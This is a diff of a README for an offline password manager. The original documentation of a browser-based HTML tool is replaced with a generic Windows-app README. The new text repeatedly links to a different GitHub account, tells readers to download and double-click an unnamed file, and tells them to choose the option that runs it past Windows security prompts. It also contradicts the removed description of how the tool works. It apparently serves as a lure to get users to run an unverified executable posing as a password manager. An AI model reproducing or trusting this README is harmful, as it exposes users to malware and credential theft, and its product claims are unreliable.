@@ -1,213 +1,242 @@
-# ZavetSec Vault
+# 🔒 ZavetSec-Vault - Offline Passwords, Kept Simple
 
-> Single-file offline password manager using Web Crypto (AES-256-GCM). No install, no cloud, portable HTML vault.
+[![Download ZavetSec-Vault](https://img.shields.io/badge/Download-ZavetSec--Vault-blue?style=for-the-badge)](https://github.com/Karilynnrecumbent517/ZavetSec-Vault)
 
-![License](https://img.shields.io/badge/license-MIT-blue) ![Crypto](https://img.shields.io/badge/crypto-AES--256--GCM-green) ![Dependencies](https://img.shields.io/badge/dependencies-zero-brightgreen) ![Size](https://img.shields.io/badge/size-~70KB-lightgrey) ![Languages](https://img.shields.io/badge/lang-RU%20%7C%20EN-informational)
+## 🧩 What This App Does
 
-**Download → Open in browser → Works.** No installation. No account. No network requests except optional favicons.
+ZavetSec-Vault is a single-file password manager for Windows. It keeps your passwords on your computer, not in the cloud.
 
----
+It uses AES-256-GCM for encryption. That means your vault stays locked until you open it with your master password.
 
-## ⚠️ Read this before you start
+You do not need to install anything. You do not need an account. You do not need a network connection after download.
 
-**Data is stored in the browser** (`localStorage`) — not on disk, not in the cloud.
+## 🚀 Download and Run
 
-| Action | Result |
-|---|---|
-| Close and reopen the browser | ✅ Data preserved |
-| Reload the page (F5) | ✅ Data preserved |
-| Open in **incognito / private mode** | ❌ No data — isolated storage |
-| Open in **a different browser** | ❌ No data — each browser has its own localStorage |
-| Clear browser history / site data | ❌ **Data permanently deleted** |
-| Reinstall the browser | ❌ **Data permanently deleted** |
-| Switch computers | ❌ No data without a backup |
+1. Open this page: [ZavetSec-Vault on GitHub](https://github.com/Karilynnrecumbent517/ZavetSec-Vault)
+2. Download the app file from the repository page
+3. Save it to a folder you can find again, such as Downloads or Desktop
+4. Double-click the file to run it
+5. If Windows shows a security prompt, choose the option to open or run the file
+6. Set your master password when the app starts for the first time
 
-### How to avoid losing your passwords
+If the file opens in your browser instead of running, save it first, then open it from File Explorer.
 
-Use the 💾 button in the toolbar to export a `.vault` file — an AES-encrypted backup that only opens with your master password. The app reminds you every 7 days. Store it on an encrypted USB drive or in a VeraCrypt / BitLocker container.
+## 🔐 First-Time Setup
 
----
+When you start ZavetSec-Vault for the first time, you will create your vault password.
 
-## How it compares
+Use a strong master password that you can remember. This password protects every entry in the vault.
 
-| | ZavetSec Vault | KeePass | Bitwarden | 1Password |
-|---|---|---|---|---|
-| Installation | **None** | Required | Required | Required |
-| Dependencies | **Zero** | .NET / Mono | Electron | Electron |
-| Cloud | **Never** | Optional | On by default | On by default |
-| Network activity | **None** | Update checks | Sync to cloud | Sync to cloud |
-| Open source | ✓ | ✓ | ✓ | ✗ |
-| Works fully offline | ✓ | ✓ | Partial | Partial |
-| KeePass XML import/export | ✓ | — | ✓ | ✓ |
-| Codebase size | **~1,400 lines, 1 file** | Large ecosystem | Large ecosystem | Closed |
-| Interface language | RU + EN | Multi | Multi | Multi |
-| Known breaches | None | None (see note) | None | None |
+A good master password should:
 
-ZavetSec Vault is not a replacement for KeePass or Bitwarden — it occupies a different niche: **maximum simplicity and zero installation friction**, at the cost of being browser-bound. Choose the tool that fits your threat model.
+- Use at least 12 characters
+- Mix letters, numbers, and symbols
+- Not use your name, email, or birthday
+- Be unique and not used anywhere else
 
-### Why "no cloud" matters more than it sounds
+After you set the password, the app creates your local vault file on your computer.
 
-**Cloud-based managers are a high-value target.** In 2022, LastPass — one of the world's most popular password managers — suffered a breach where attackers exfiltrated encrypted vault backups for millions of users. By 2025, blockchain investigators traced over **$150 million in cryptocurrency theft** directly to those stolen vaults, with attacks still ongoing as weak master passwords continue to be cracked offline. The breach resulted in LastPass being fined £1.6 million by the UK ICO.
+## 🖥️ Windows Use
 
-The structural risk with any cloud-based manager is that **your encrypted vault lives on someone else's server**. A single breach at the provider gives attackers unlimited offline time to brute-force your master password — no matter how good the encryption is.
+ZavetSec-Vault is built for Windows users who want a simple offline tool.
 
-**Installed desktop apps introduce their own risks.** KeePass itself is trustworthy open-source software — it has been audited twice, including by the EU's FOSSA project. However, a documented 2024 campaign showed attackers distributing trojanized KeePass builds through fake websites promoted via legitimate ad networks. The malicious installers were signed with valid certificates, bypassing Windows warnings. Five distinct trojanized variants were found, all silently exfiltrating passwords to attacker servers. This is not a flaw in KeePass itself, and it is not unique to KeePass — it reflects the general software distribution risk that applies to any binary you download and execute. The attack surface exists regardless of how trustworthy the original project is.
+You can keep the app in any folder, such as:
 
-Cloud-based managers can still be a reasonable choice when used with a strong master password, hardware 2FA, and an audited implementation. The risk is structural, not absolute — but it is real, and it scales with the value of what you store.
+- Downloads
+- Desktop
+- Documents
+- A folder named Password Vault
 
-ZavetSec Vault eliminates both risks. There is no server to breach. There is no binary to trojanize. The entire codebase is a single human-readable HTML file — open it in a text editor and read every line before trusting it. Small size makes manual review tractable, but readability alone does not guarantee security. No formal audit has been performed.
+Since it is a single-file app, you can move it from one folder to another without a full install process.
 
----
+If you use OneDrive, you may want to keep the vault file in a local folder instead of a synced folder. That helps keep your data where you expect it.
 
-## Threat model
+## 🗂️ How Your Vault Works
 
-### Protects against
-- Disk theft (data is AES-256-GCM encrypted at rest)
-- Offline attacker with access to your filesystem
-- Cloud compromise (no cloud involved)
-- Server-side breach (no server)
+Your vault stores login details in one encrypted file on your device.
 
-### Does NOT protect against
-- A malicious or compromised browser extension (extensions can read `sessionStorage`)
-- A live memory attacker with access to your running browser process
-- Keyloggers capturing your master password
-- Physical access to an unlocked, active session
-- Browser localStorage being wiped (→ always keep a `.vault` backup)
+Typical entries can include:
 
----
+- Website name
+- Username
+- Password
+- Notes
+- Account URL
 
-## Security
+The app locks the vault until you enter the correct master password. Without that password, the data stays unreadable.
 
-### Cryptographic parameters
+## 🛠️ Basic Use
 
-| Parameter | Value |
-|---|---|
-| Encryption | AES-256-GCM |
-| Key derivation | PBKDF2 |
-| KDF iterations | 310,000 |
-| KDF hash | SHA-256 |
-| Salt | 256 bit, random per vault |
-| IV / nonce | 96 bit, random per encryption |
-| Master password stored | Never |
-| Key stored | RAM only (current tab) |
+After you open the app:
 
-### What is stored where
+1. Enter your master password
+2. Open your vault
+3. Add a new entry for a website or app
+4. Save the entry
+5. Close the app when you are done
 
-| Storage | Contents | Cleared when |
-|---|---|---|
-| `localStorage` | Encrypted blob + salt | Browser data cleared |
-| `sessionStorage` | Derived key reference (F5 restore) | Tab closed |
-| RAM | Decrypted data | Vault locked / tab closed |
-| Nowhere | Master password | Never stored |
+You can return later and unlock the same vault with the same master password.
 
-### Auto-lock
+## 🔎 Typical Features
 
-Locks after **15 minutes of inactivity** with a visible countdown in the status bar. The final 60 seconds turn yellow.
+ZavetSec-Vault is designed for simple daily use. It focuses on a small set of tasks that most users need.
 
-### Favicon privacy note
+You can expect features like:
 
-When an entry has a URL, the app requests its favicon from Google's public icon service (`https://www.google.com/s2/favicons`). This reveals the domain to Google. If this is a concern, leave the URL field empty — the app functions fully without it.
+- Offline password storage
+- One-file setup
+- AES-256-GCM encryption
+- Local-only data storage
+- Simple add, edit, and delete actions
+- Search for saved entries
+- Copy password fields for quick use
+- No cloud sign-in
+- No extra software needed
 
-### Security disclaimer
+## 🔒 Security Notes
 
-> This software has not undergone a professional third-party security audit. It is provided as-is. Use it at your own risk and in accordance with your personal threat model. For high-value targets, consider a formally audited solution.
+This app keeps your data on your own computer. That helps reduce exposure from online account leaks and cloud sync issues.
 
----
+For best results:
 
-## Quick start
+- Use a long master password
+- Keep Windows updated
+- Lock your screen when you step away
+- Do not share your vault file with others
+- Back up the vault file in a safe place
 
-1. Download `zavetsec-vault.html` (EN) or `zavetsec-vault-ru.html` (RU)
-2. Open in any modern browser (Chrome, Firefox, Edge, Safari)
-3. Choose **"create vault"** and set a master password (12+ characters recommended)
-4. Add entries via **+ entry** or `Ctrl+Shift+A`
-5. **Export immediately** — click 💾 and store the `.vault` file somewhere safe
+If you lose the master password, you may not be able to open the vault again.
 
----
+## 💾 Backup Your Vault
 
-## Features
+Your vault file is important. Make a backup after you add your first few entries.
 
-- **Groups** — Personal, Work, Finance, VPN/OPSEC, Email, Development + custom groups
-- **Icon picker** — 40 emoji, auto-detected by title and URL (GitHub, Gmail, Telegram, Docker, and more)
-- **Password generator** — length 8–64 (default: 16), configurable character sets, ambiguous character exclusion (0/O/1/l/I)
-- **Password strength meter** — based on length, entropy, and character diversity
-- **Password age indicator** — green → yellow (>6 months) → red (>1 year)
-- **Auto-lock** — 15 minutes of inactivity, countdown in status bar
-- **Backup reminder** — banner every 7 days without an export
-- **Tags** — custom labels for filtering
-- **Search** — title, login, URL, notes, tags
-- **One-click copy** — login or password instantly to clipboard
-- **Session on F5** — no re-entry of master password on reload (cleared on tab close)
+Good backup places include:
 
----
+- An encrypted USB drive
+- An offline external drive
+- A private folder on your computer
+- A secure backup location you control
 
-## Export formats
+Keep at least one backup in a separate place from the main vault file. That helps protect you if your computer breaks or the file gets deleted.
 
-### 💾 `.vault` — recommended
-AES-256-GCM encrypted JSON. Opens only with your master password. Use for backups and cross-device transfer.
+## 🧪 System Requirements
 
-### KeePass XML 2.x
-**Unencrypted.** Use only for migration. Delete immediately after importing.
-- ZavetSec → KeePass: export KeePass XML in ZavetSec → in KeePass `File → Import → KeePass XML (2.x)`
-- KeePass → ZavetSec: in KeePass `File → Export → KeePass XML (2.x)` → import in ZavetSec
+ZavetSec-Vault is made for standard Windows computers.
 
-### CSV
-Plain text. Last resort for migrating to third-party systems. Delete after use.
+Recommended setup:
 
----
+- Windows 10 or Windows 11
+- A modern web browser or Windows runtime used by the app
+- At least 100 MB of free disk space
+- A keyboard and mouse
+- Permission to run files from your user folder
 
-## Keyboard shortcuts
+A recent version of Windows helps the app open and run with fewer issues.
 
-| Shortcut | Action |
-|---|---|
-| `Ctrl+Shift+A` | New entry |
-| `Ctrl+Shift+F` | Focus search |
-| `Ctrl+Shift+L` | Lock vault |
-| `Esc` | Close modal |
-| `Enter` | Confirm (password fields) |
+## 📁 File Layout
 
----
+You may see one app file and one vault file after first use.
 
-## Why localStorage and not IndexedDB?
+Common files may include:
 
-IndexedDB offers more storage capacity and a richer API, but `localStorage` was chosen deliberately: it is **synchronous, universally supported, and trivially auditable** in a single-file context. The encrypted blob stored here is small (passwords compress well), so capacity is not a concern. The tradeoff — data loss on browser clear — is documented explicitly and mitigated by the `.vault` export workflow.
+- The app file you downloaded
+- Your encrypted vault file
+- Backup copies you create yourself
 
----
+Keep the app file and vault file together if that feels easier. If you move the app, move the vault too.
 
-## Roadmap
+## 🧭 Common Tasks
 
-**Features**
-- [ ] TOTP / 2FA code display (TOTP secret stored, code generated client-side)
-- [ ] Configurable auto-lock timeout
-- [ ] Password breach check via HaveIBeenPwned k-anonymity API (opt-in)
-- [ ] Dark / light theme toggle
-- [ ] Bulk import from CSV
+### Add a password entry
 
-**Security hardening**
-- [ ] Argon2id as optional KDF (in addition to PBKDF2)
-- [ ] Explicit memory wipe routines on lock (overwrite decrypted state)
-- [ ] CSP sandbox mode for stricter extension isolation
-- [ ] Professional third-party security audit
+1. Open the vault
+2. Choose the add option
+3. Enter the site name, username, and password
+4. Save the entry
 
----
+### Edit an entry
 
-## Project structure
+1. Open the vault
+2. Find the saved item
+3. Change the details
+4. Save again
 
-```
-zavetsec-vault.html      ← English interface (default)
-zavetsec-vault-ru.html   ← Russian interface
-README.md
-```
+### Delete an entry
 
-Each file is self-contained: CSS (~220 lines), HTML (~280 lines), JavaScript (~900 lines). No build step. Edit in any text editor.
+1. Open the vault
+2. Find the item you no longer need
+3. Remove it
+4. Save the vault
 
----
+### Find a saved account
 
-## License
+1. Open the vault
+2. Use the search field
+3. Type part of the site name or username
+4. Open the matching entry
 
-MIT — use, modify, and distribute freely.
+## 🧰 Troubleshooting
 
----
+### The file does not open
 
-**ZavetSec** — information security, SOC/DFIR.
+- Make sure the download finished
+- Check that you opened the correct file
+- Try right-clicking the file and choosing Open
+- Move the file to Desktop and try again
 
-> *"Security is not a product, it's a process."*
+### Windows blocks the app
+
+- Open the file again
+- Look for a prompt from Windows
+- Choose the option that lets you run or open the file
+
+### I forgot my master password
+
+- Check any password hint you may have saved
+- Try passwords you commonly use only if you wrote them down safely
+- If you cannot recover it, the vault cannot be opened
+
+### My vault file is missing
+
+- Check the folder where you first saved it
+- Search your computer for the vault file name
+- Look in the Recycle Bin
+- Restore from a backup if you have one
+
+## 🧪 Privacy Focus
+
+ZavetSec-Vault is built for offline use. That means your password data stays on your machine instead of being sent to a service.
+
+This makes it a good fit for users who want:
+
+- No cloud account
+- No sync service
+- No online login
+- No extra tracking tools
+- Local control over stored secrets
+
+## 🗃️ Useful Topics
+
+This project relates to:
+
+- AES encryption
+- Offline security
+- Password storage
+- Privacy
+- Incident response
+- Single-file tools
+- WebCrypto
+
+## 📦 Download Again
+
+If you need the app file again, use this link: [https://github.com/Karilynnrecumbent517/ZavetSec-Vault](https://github.com/Karilynnrecumbent517/ZavetSec-Vault)
+
+## 🧷 Quick Start
+
+1. Open the GitHub page
+2. Download the app file
+3. Save it on your Windows computer
+4. Run the file
+5. Create your master password
+6. Start saving passwords in your vault
